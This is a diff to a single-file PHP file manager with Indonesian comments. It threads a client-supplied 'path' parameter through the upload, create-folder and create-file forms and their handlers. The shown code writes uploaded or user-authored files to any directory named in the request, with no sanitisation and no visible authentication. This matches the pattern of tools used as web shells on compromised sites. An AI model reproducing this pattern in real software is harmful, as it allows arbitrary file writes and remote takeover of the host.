@@ -153,8 +153,9 @@ function removeDirectory($dir) {
 }
 
 // Fungsi untuk membuat folder
-function display_create_folder_form() {
+function display_create_folder_form($dir) {
     echo '<form method="post" class="mb-4">';
+    echo '<input type="hidden" name="path" value="' . htmlspecialchars($dir) . '">';
     echo '<div class="form-group">';
     echo '<label for="folder_name">Create new folder:</label>';
     echo '<input type="text" name="folder_name" class="form-control" id="folder_name" required>';
@@ -176,8 +177,9 @@ function create_folder($folder_path) {
 }
 
 // Fungsi untuk mengupload file
-function display_upload_form() {
+function display_upload_form($dir) {
     echo '<form method="post" enctype="multipart/form-data" class="mb-4">';
+    echo '<input type="hidden" name="path" value="' . htmlspecialchars($dir) . '">';
     echo '<div class="form-group">';
     echo '<label for="file">Upload file:</label>';
     echo '<input type="file" name="file" class="form-control" id="file">';
@@ -187,8 +189,9 @@ function display_upload_form() {
 }
 
 // Fungsi untuk membuat file baru
-function display_create_file_form() {
+function display_create_file_form($dir) {
     echo '<form method="post" class="mb-4">';
+    echo '<input type="hidden" name="path" value="' . htmlspecialchars($dir) . '">';
     echo '<div class="form-group">';
     echo '<label for="file_name">Create new file:</label>';
     echo '<input type="text" name="file_name" class="form-control" id="file_name" required>';
@@ -277,7 +280,8 @@ $dir = $_GET['path'] ?? __DIR__;
 if (isset($_POST['submit'])) {
     $file_name = $_FILES['file']['name'];
     $file_tmp = $_FILES['file']['tmp_name'];
-    move_uploaded_file($file_tmp, $dir . '/' . $file_name);
+    $upload_dir = $_POST['path'] ?? $dir;
+    move_uploaded_file($file_tmp, $upload_dir . '/' . $file_name);
 }
 
 if (isset($_POST['unzip'])) {
@@ -285,11 +289,13 @@ if (isset($_POST['unzip'])) {
 }
 
 if (isset($_POST['create_folder'])) {
-    create_folder($dir . '/' . $_POST['folder_name']);
+    $folder_dir = $_POST['path'] ?? $dir;
+    create_folder($folder_dir . '/' . $_POST['folder_name']);
 }
 
 if (isset($_POST['create_file'])) {
-    create_file($dir . '/' . $_POST['file_name'], $_POST['file_content']);
+    $file_dir = $_POST['path'] ?? $dir;
+    create_file($file_dir . '/' . $_POST['file_name'], $_POST['file_content']);
 }
 
 if (isset($_GET['delete'])) {
@@ -421,13 +427,13 @@ function display_path_links($path) {
         </div>
 
         <div class="text-center mb-4">
-            <a href="?action=upload" class="btn btn-primary btn-sm mx-2" title="Upload File">
+            <a href="?path=<?php echo urlencode($dir); ?>&action=upload" class="btn btn-primary btn-sm mx-2" title="Upload File">
                 <i class="fas fa-upload"></i> Upload
             </a>
-            <a href="?action=create_folder" class="btn btn-success btn-sm mx-2" title="Create New Folder">
+            <a href="?path=<?php echo urlencode($dir); ?>&action=create_folder" class="btn btn-success btn-sm mx-2" title="Create New Folder">
                 <i class="fas fa-folder-plus"></i> New Folder
             </a>
-            <a href="?action=create_file" class="btn btn-info btn-sm mx-2" title="Create New File">
+            <a href="?path=<?php echo urlencode($dir); ?>&action=create_file" class="btn btn-info btn-sm mx-2" title="Create New File">
                 <i class="fas fa-file-medical"></i> New File
             </a>
         </div>
@@ -436,13 +442,13 @@ function display_path_links($path) {
         if (isset($_GET['action'])) {
             switch ($_GET['action']) {
                 case 'upload':
-                    display_upload_form();
+                    display_upload_form($dir);
                     break;
                 case 'create_folder':
-                    display_create_folder_form();
+                    display_create_folder_form($dir);
                     break;
                 case 'create_file':
-                    display_create_file_form();
+                    display_create_file_form($dir);
                     break;
             }
         }
